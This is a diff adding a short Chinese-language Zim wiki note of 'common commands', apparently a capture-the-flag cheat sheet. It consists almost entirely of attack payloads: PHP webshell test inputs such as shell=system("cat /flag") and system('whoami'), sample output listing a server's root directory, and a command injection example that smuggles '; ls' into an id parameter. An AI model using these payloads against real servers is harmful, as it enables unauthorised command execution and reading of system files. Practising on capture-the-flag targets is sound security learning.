@@ -1,0 +1,20 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2025-08-29T18:09:38+08:00
+
+====== 常用指令 ======
+Created 星期五 29 八月 2025
+
+测试指令/shell 指令：
+shell=phpinfo();
+shell=echo 123;
+shell=system("ls /"); -> "bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var"
+shell=system("cat /flag");
+system('whoami');
+tac /file
+
+ls
+cat
+
+指令注入 <内为注入点>：
+system("xxx.sh <id=1; ls>")
